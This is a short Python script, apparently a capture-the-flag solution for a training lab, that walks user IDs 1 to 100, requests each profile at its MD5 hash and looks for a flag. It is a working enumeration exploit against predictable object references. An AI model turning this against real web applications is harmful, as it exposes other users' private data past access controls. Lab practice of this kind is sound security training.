import requests
import hashlib

BASE_URL = "http://chatelaine.cylabacademy.net:46099"

print("[*] Probando IDs del 1 al 100 con MD5(ID)...")

for emp_id in range(1, 101):
    h = hashlib.md5(str(emp_id).encode()).hexdigest()
    url = f"{BASE_URL}/profile/user/{h}"
    r = requests.get(url)
    
    if r.status_code == 200:
        print(f"[+] ID {emp_id} (MD5: {h}) -> Status: {r.status_code}")
        print("    Contenido:", r.text.strip())
        if "academy{" in r.text or "picoctf{" in r.text or "flag" in r.text.lower():
            print("=" * 60)
            print(f"[!] ¡FLAG ENCONTRADA EN ID {emp_id}!")
            print(r.text)
            print("=" * 60)
            break
